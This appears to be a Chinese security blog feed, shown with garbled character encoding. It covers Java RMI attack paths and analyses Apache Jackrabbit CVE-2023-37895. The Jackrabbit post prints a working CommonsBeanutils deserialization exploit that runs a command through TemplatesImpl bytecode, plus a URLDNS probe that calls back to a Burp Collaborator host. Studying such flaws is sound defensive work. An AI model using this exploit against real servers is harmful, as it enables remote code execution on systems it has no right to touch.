class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.unbind&quot;</span>);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var8 = var2.getInputStream();<br>                    var7 = (String)var8.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var67) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var67);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.unbind(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var66) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var66);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ"><a href="#æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ"></a>æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ</h2><p>è¿™é‡Œå°±ä¸è·Ÿäº†ï¼Œæµç¨‹åŸºæœ¬ä¸Šå¤§å·®ä¸å·®ã€‚åªä¸è¿‡æœåŠ¡ç«¯ä¼šè°ƒç”¨bindï¼Œcaseçš„ç‚¹ä¸ä¸€æ ·ã€‚</p><h1 id="æ”»å‡»æœåŠ¡ç«¯"><a href="#æ”»å‡»æœåŠ¡ç«¯" class="headerlink" title="æ”»å‡»æœåŠ¡ç«¯"></a>æ”»å‡»æœåŠ¡ç«¯</h1><h2 id="å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯"><a href="#å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯" class="headerlink" title="å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯"></a>å®¢æˆ·ç«¯æ”»å‡»æœåŠ¡ç«¯</h2><p>ä¹‹åæˆ‘ä»¬è¦ç¡®ä¿è·å–åˆ°çš„Targetæ˜¯åŠ¨æ€ä»£ç†ï¼Œå› ä¸ºè¿™æ ·æ‰æ˜¯æœåŠ¡ç«¯åœ¨å¤„ç†è¯·æ±‚ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/26/f724a2cf95fefb7956f583c232d91d31.png" alt="image-20230826120329281"></p><p>ä¹Ÿæ˜¯ä¼šæ¥åˆ°Transport.<code>serviceCall()</code>ï¼Œè°ƒç”¨<code>dispatch()</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/8cd6cc77f66f85abe8fe4d4b85bbe963.png" alt="image-20230826115940552"></p><p>è·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/f483e7ef457d6cd00fb0328c60a219cd.md.png" alt="image-20230826120750763"></p><p>æˆ‘ä»¬å‘ç°ä¹‹å‰æ³¨å†Œä¸­å¿ƒåœ¨å¤„ç†çš„æ—¶å€™ï¼Œå› ä¸ºæ¥æ”¶åˆ°çš„skelä¸ä¸ºç©ºæ‰€ä»¥èµ°çš„æ˜¯ä¸Šé¢çš„ifï¼Œä½†æ˜¯æœåŠ¡ç«¯åœ¨å¤„ç†çš„æ—¶å€™ä¼šç›´æ¥èµ°åˆ°ä¸‹é¢ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/26/bf85634377be2a60af91a108bb62f185.png" alt="image-20230826121943913"></p><p>è¿™é‡Œä¼šè°ƒç”¨è¿™ä¸ª<code>unmarshalValue()</code>æ–¹æ³•ï¼Œå…¶å®è¿™ä¸ªæ–¹æ³•å°±æ˜¯å°†å®¢æˆ·ç«¯çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/18afcf7110b1f6d2503ced7427d2686f.png" alt="image-20230826122123337"></p><p>æœ€ååœ¨è¿›è¡ŒçœŸæ­£çš„è°ƒç”¨ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/48eef62b1e7d378be7f3ed7f49e12e81.png" alt="image-20230826122303876"></p><p>çœ‹åˆ°è¿™åˆ©ç”¨ç‚¹ä¹Ÿå°±å‡ºæ¥äº†ï¼Œå°±æ˜¯æˆ‘ä»¬ä¸Šé¢çš„readObjectäº†ã€‚</p><h2 id="æ³¨å†Œä¸­å¿ƒæ”»å‡»æœåŠ¡ç«¯"><a href="#æ³¨å†Œä¸­å¿ƒæ”»å‡»æœåŠ¡ç«¯" class="headerlink" title="æ³¨å†Œä¸­å¿ƒæ”»å‡»æœåŠ¡ç«¯"></a>æ³¨å†Œä¸­å¿ƒæ”»å‡»æœåŠ¡ç«¯</h2><p>åŒæ ·çš„å¥—è·¯ï¼Œæˆ‘ä»¬ç›´æ¥ç•¥è¿‡ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬çš„RMIä¹Ÿå°±è‰è‰ç»“æŸäº†ï¼Œï¼Œå…¶å®æˆ‘åªæ˜¯å¾ˆæµ…æ˜¾çš„å†™äº†ä¸€ä¸‹ï¼ŒåŒ…æ‹¬ä»–è¿˜æœ‰é€šè¿‡JRMPå»æ”»å‡»å®¢æˆ·ç«¯ã€å›æ”¶æœºåˆ¶ã€é«˜ç‰ˆæœ¬ç»•è¿‡ã€ç­‰ç­‰ã€‚æˆ‘è§‰å¾—å…ˆæµ…æµ…çš„äº†è§£ä¸€ç‚¹ï¼Œç­‰åé¢ç”¨å¾—ç€å†æ·±å…¥çš„å­¦è¿™æ ·æ˜¯å¥½çš„ã€‚ç„¶ååé¢çš„ä¸»çº¿å°±æ˜¯å»åˆ†æä¸€äº›ç±»ä¼¼äºRMIçš„è¿™ç§åœ¨javaå®‰å…¨ä¸­æœ‰ç€ä¸€å¸­ä¹‹åœ°çš„ä¸œè¥¿ï¼Œæ”¯çº¿çš„è¯å¶å°”ä¼šç©¿æ’ä¸€äº›æ¼æ´åˆ†ææ–‡ç« ã€‚æˆ‘å°½é‡è‡ªå¾‹ï¼Œä¿æŒç¨³å®šçš„äº§å‡ºé€Ÿåº¦(å¦‚æœæ²¡æœ‰ä»€ä¹ˆæ„å¤–å‘ç”Ÿ)ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æµ…æApache Jackrabbit(CVE-2023-37895)</title>
    <link href="/2023/08/24/%E6%B5%85%E6%9E%90ApacheJackrabbit/"/>
    <url>/2023/08/24/%E6%B5%85%E6%9E%90ApacheJackrabbit/</url>
    
    <content type="html"><![CDATA[<h1 id="Apache-Jackrabbitååºåˆ—åŒ–æ¼æ´åˆ†æ-CVE-2023-37895"><a href="#Apache-Jackrabbitååºåˆ—åŒ–æ¼æ´åˆ†æ-CVE-2023-37895" class="headerlink" title="Apache Jackrabbitååºåˆ—åŒ–æ¼æ´åˆ†æ(CVE-2023-37895)"></a>Apache Jackrabbitååºåˆ—åŒ–æ¼æ´åˆ†æ(CVE-2023-37895)</h1><h2 id="æ¼æ´ç®€è¿°ï¼š"><a href="#æ¼æ´ç®€è¿°ï¼š" class="headerlink" title="æ¼æ´ç®€è¿°ï¼š"></a>æ¼æ´ç®€è¿°ï¼š</h2><p>Apache Jackrabbitæ˜¯Apacheå…¬å¸çš„ä¸€ä¸ªå†…å®¹å­˜å‚¨åº“ã€‚</p><p>Apache Jackrabbit Webapp&#x2F;Standaloneå­˜åœ¨ä»£ç é—®é¢˜æ¼æ´ï¼Œè¯¥æ¼æ´æºäºç»„ä»¶commons-beanutilså­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚</p><p>å—å½±å“çš„äº§å“å’Œç‰ˆæœ¬ï¼šApache Jackrabbit Webapp&#x2F;Standalone 2.20.10åŠä¹‹å‰ç‰ˆæœ¬ï¼Œ2.21.17åŠä¹‹å‰ç‰ˆæœ¬ã€‚</p><h2 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h2><p>é¦–å…ˆé€šè¿‡RemoteBindingServletçš„<code>getRemoteRepository()</code>è·å–Repositoryå¯¹è±¡ï¼Œç„¶åè½¬åŒ–ä¸ºStubä»£ç†å¯¹è±¡è¿”å›ç»™Responseã€‚è·Ÿè¿›<code>getRemoteRepository()</code></p><p><img src="https://ice.frostsky.com/2023/08/23/3e51c5505f738c4e142b602ec4d2bda8.png" alt="image-20230823094610422"></p><p>è¿™é‡Œè°ƒç”¨<code>getRemoteAdapterFactory()</code>è·å–<code>RemoteAdpterFactory</code>å¯¹è±¡ã€‚é»˜è®¤æ˜¯<code>ServerAdapterFactory()</code>ç„¶åè°ƒç”¨ServerAdapterFactory.<code>getRemoteRepository</code>æ–¹æ³•è·å–Repositoryå¯¹è±¡ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/23/ecfe09983ae899065f16e76dbc45075f.png" alt="image-20230823095842783"></p><p><img src="https://ice.frostsky.com/2023/08/23/02d1a71e1ecc211a0332ce19d1290c06.png" alt="image-20230823100307211"></p><p>å½“å®¢æˆ·ç«¯è·å–åˆ°Repositoryå¯¹è±¡åï¼Œå¯ä»¥è°ƒç”¨Repositoryçš„<code>login</code>æ–¹æ³•ï¼Œè·Ÿè¿›åˆ°ClientRepositoryçš„å®ç°ç±»ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/23/a83a93ff99ef7a6e14457fd6f09f2212.png" alt="image-20230823100644700"></p><p>é‡Œé¢åˆä¼šè°ƒå¦å¤–ä¸€ä¸ª<code>login()</code>(ClientRepository)ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/23/18decbb0f66fe753ab4162b7be6a5772.png" alt="image-20230823100743053"></p><p>æœ€åé€šè¿‡RMIè®²å®¢æˆ·ç«¯çš„<code>Credentials</code>ç±»ä¼ è¾“åˆ°æœåŠ¡ç«¯ï¼Œå…¶ä¸­ç”¨çš„æ˜¯RMIåº•å±‚çš„JRMPåè®®ï¼Œå°†å®¢æˆ·ç«¯åºåˆ—åŒ–åï¼ŒæŠŠåºåˆ—åŒ–çš„æ•°æ®ä¼ è¾“åˆ°æœåŠ¡ç«¯åœ¨ååºåˆ—åŒ–(ä¸Šç¯‡RMIä¸­çš„Cå’ŒSçš„é€šä¿¡è¿‡ç¨‹)ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ¶æ„çš„<code>Credentials</code>å¯¹è±¡ï¼Œåˆ™ä¼šæ‰§è¡Œç›¸å…³çš„æ¶æ„ä»£ç ã€‚(ServerRepository.login)ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/23/e8d00852c0351e3d9472a29e0877a7a3.png" alt="image-20230823101423557"></p><p>è·Ÿè¿›<code>Credentials</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/23/76d076a6218510f0cf15a7989cfbf827.png" alt="image-20230823101900193"></p><p>å‘ç°ä»–ä¸ä»…ç»§æ‰¿äº†<code>Serializable</code>è¿˜æœ‰å¾ˆå¤šå®ç°ç±»ï¼Œæˆ‘ä»¬è·Ÿè¿›<code>SimpleCredentials</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/23/c89365752b2f6da8284d9457497ebd36.png" alt="image-20230823102102814"></p><p>å‘ç°attributeså±æ€§æ˜¯Mapè€Œä¸”å¯ä»¥å­˜å‚¨ä»»æ„Objectç±»å‹å¯¹è±¡ã€‚æˆ‘ä»¬é€šè¿‡<code>setAttribute()</code>æ–¹æ³•å°†æ„é€ çš„æ¶æ„<code>PriorityQueue</code>å¯¹è±¡å­˜åœ¨åˆ°è¿™ä¸ª<code>AttributesMap</code>ä¸­ã€‚</p><p>å½“ååºåˆ—åŒ–åŒ…å«æ¶æ„<code>PriorityQueue</code>çš„<code>SimpleCredentials</code>å¯¹è±¡æ—¶ï¼Œä¼šé€’å½’ååºåˆ—åŒ–å®ƒçš„æ‰€æœ‰å±æ€§ï¼Œå…¶ä¸­å°±åŒ…å«äº†attributesè¿™ä¸ªMapï¼Œååºåˆ—åŒ–attributesæ—¶,ä¹Ÿä¼šååºåˆ—åŒ–å…¶ä¸­å­˜æ”¾çš„<code>PriorityQueue</code>å¯¹è±¡ï¼Œè¿™æ ·å°±ä¼šè§¦å‘<code>PriorityQueue</code>å¯¹è±¡ä¸­çš„ååºåˆ—åŒ–é€»è¾‘ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h2 id="POCå’ŒEXP"><a href="#POCå’ŒEXP" class="headerlink" title="POCå’ŒEXP"></a>POCå’ŒEXP</h2><p><strong>expæ€è·¯ï¼š</strong></p><p>è¯¥é¡¹ç›®åŒ…å«äº†Commons BeanUtilsç»„ä»¶ï¼Œå¯åˆ©ç”¨CBé“¾æ„é€ æ¶æ„Credentialså¯¹è±¡ã€‚</p><p><strong>exp_demoï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.jackrabbit.rmi.repository.URLRemoteRepository;<br><span class="hljs-keyword">import</span> javax.jcr.Repository;<br><span class="hljs-keyword">import</span> javax.jcr.SimpleCredentials;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String Name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(Name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplatesImpl(String cmd) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>            ctClass.setSuperclass(superClass);<br>            <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>            constructor.setBody(<span class="hljs-string">&quot; try &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +<br>                    <span class="hljs-string">&quot;\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot; &#125;&quot;</span>);<br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            ctClass.defrost();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;&#125;;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = getTemplatesImpl(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        setFieldValue(obj,  <span class="hljs-string">&quot;_name&quot;</span>,  <span class="hljs-string">&quot;aaaa&quot;</span>);<br>        setFieldValue(obj,  <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>( <span class="hljs-literal">null</span>,String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; payload = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,comparator);<br>        payload.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        payload.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(comparator,  <span class="hljs-string">&quot;property&quot;</span>,  <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(payload, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj,obj&#125;);<br><br>        <span class="hljs-type">SimpleCredentials</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleCredentials</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>.toCharArray());<br>        exp.setAttribute( <span class="hljs-string">&quot;admin111&quot;</span>,payload);<br>        <span class="hljs-type">Repository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLRemoteRepository</span>(<span class="hljs-string">&quot;http://localhost:8080/rmi&quot;</span>);<br>        repository.login(exp);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¤ç°ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/23/b87ad1dd168aa8e5276dba4551382016.png" alt="image-20230823112724991"></p><p><strong>pocæ€è·¯ï¼š</strong></p><p>å› ä¸ºRuntimeçš„execæ²¡æœ‰å›æ˜¾ï¼Œé‚£ä¹ˆè¿™é‡Œæœ‰ä¸¤ç§æ€è·¯ï¼š</p><ol><li>å› ä¸ºç”¨çš„æ˜¯RMIï¼ŒRMIåº•å±‚æ˜¯JRMPï¼Œå¯ä»¥åˆ©ç”¨ysoserialä¸­JRMPè®©æœåŠ¡ç«¯å›è¿ã€‚</li><li>å› ä¸ºåˆ©ç”¨é“¾ä¸­æœ‰HashMapç±»å‹çš„attributesï¼Œå¯ä»¥åˆ©ç”¨URLDNSè¿™æ¡é“¾ï¼Œè®©æœåŠ¡å™¨å›è¿ã€‚</li></ol><p><strong>poc_demoï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.jcr.Repository;<br><span class="hljs-keyword">import</span> javax.jcr.SimpleCredentials;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://6nueyl0q7a2vwl21uub3t1a4wv2lqa.burpcollaborator.net&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clas</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clas.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(url,<span class="hljs-number">123</span>); <span class="hljs-comment">//å°†urlçš„hashcodeå±æ€§æ”¹ä¸º123ä½¿å…¶ä¸ç­‰äº-1</span><br>        map.put(url,<span class="hljs-string">&quot;2333&quot;</span>); <span class="hljs-comment">//è¿™é‡Œçš„valueç”¨ä¸ä¸Šï¼Œéšä¾¿è®¾ç½®</span><br>        field.set(url,-<span class="hljs-number">1</span>);<span class="hljs-comment">//putå®Œä¹‹åï¼Œæˆ‘ä»¬å°±éœ€è¦å°†hashcodeå±æ€§æ”¹å›æˆ-1ï¼Œä»è€Œèƒ½æ‰§è¡Œhandler.hashcode</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> map;<br><br>            <span class="hljs-type">SimpleCredentials</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleCredentials</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>.toCharArray());<br>            exp.setAttribute(<span class="hljs-string">&quot;admin&quot;</span>,payload);<br>            <span class="hljs-type">Repository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLRemoteRepository</span>(<span class="hljs-string">&quot;http://localhost:8080/rmi&quot;</span>);<br>            repository.login(exp);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¤ç°ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/23/d7c999a07f529540a15ced4c88266332.png" alt="image-20230823102630191"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´åˆ†æ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ²¡äººæ¯”æˆ‘æ›´æ‡‚RMI(ä¸­)</title>
    <link href="/2023/08/22/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI2/"/>
    <url>/2023/08/22/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI2/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« å½“ä¸­æˆ‘ä»¬ç®€å•çš„è®²è§£äº†RMIçš„åŸºç¡€æ¦‚å¿µï¼Œåœ¨è¿™ä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥å‰–æRMIå„éƒ¨åˆ†çš„é€šä¿¡è¿‡ç¨‹ï¼Œæœ€åä¸€ç¯‡å†æ¥è®²æ¼æ´åˆ©ç”¨ã€‚</p><p>æœ‰æœ‹å‹è¯´ä¸Šä¸€ç¯‡åªæ”¾æˆªå›¾æ²¡æœ‰åœˆé‡ç‚¹ï¼Œè¿™æ ·å¯¹åˆšå¼€å§‹å­¦çš„å­¦å¼Ÿå­¦å¦¹ä¸å¤ªå‹å¥½ï¼Œé‚£æˆ‘è¿™ä¸€ç¯‡æˆ‘å°½é‡è¡¥ä¸Šã€‚</p><p>é€šè¿‡ä¹‹å‰çš„è®²è§£æˆ‘ä»¬çŸ¥é“RMIä¸€å…±åˆ†ä¸ºä¸‰éƒ¨åˆ†åˆ†åˆ«æ˜¯ï¼šå®¢æˆ·ç«¯ã€æœåŠ¡ç«¯ã€æ³¨å†Œä¸­å¿ƒã€‚ä»–ä»¬ä¹‹é—´å¯ä»¥ä¸¤ä¸¤ç›¸äº’é€šä¿¡ã€‚ç®€å•ç”»ä¸ªå›¾å°±æ˜¯è¿™æ ·ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/23039956dc27c72043edd4276ba1853d.png" alt="image-20230822145352149"></p><p>è·å–æ³¨å†Œä¸­å¿ƒçš„æ–¹å¼å…±æœ‰ä¸¤ç§ï¼š</p><p>ä¸€ç§æ˜¯ï¼š<code>Registry r = LocateRegistry.createRegistry(1088);</code>åœ¨åˆ›å»ºæ—¶è·å–ã€‚</p><p>å¦ä¸€ç§æ˜¯ï¼š<code>Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1088);</code>è¿œç¨‹è·å–ã€‚</p><h3 id="æœ¬åœ°è·å–æ³¨å†Œä¸­å¿ƒ"><a href="#æœ¬åœ°è·å–æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="æœ¬åœ°è·å–æ³¨å†Œä¸­å¿ƒ"></a>æœ¬åœ°è·å–æ³¨å†Œä¸­å¿ƒ</h3><p>æˆ‘ä»¬å…ˆæ¥çœ‹ç¬¬ä¸€ç§ï¼Œæœ¬åœ°è·å–æ³¨å†Œä¸­å¿ƒã€‚</p><p><code>createRegistry()</code>å¦‚ä¸‹æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/4b2d9342d88710f6d22136e3096d1408.png" alt="image-20230822150942148"></p><p>ç¬¬ä¸€ç§åªéœ€è¦ä¼ å…¥<code>port</code>ï¼ˆè¿™é‡Œçš„portä»£è¡¨çš„å°±æ˜¯æ³¨å†Œä¸­å¿ƒç›‘å¬çš„ç«¯å£ï¼‰</p><p>ç¬¬äºŒç§æ–¹å¼é™¤äº†ä¼ å…¥ç«¯å£ä¹‹å¤–ï¼Œè¿˜éœ€è¦ä¼ 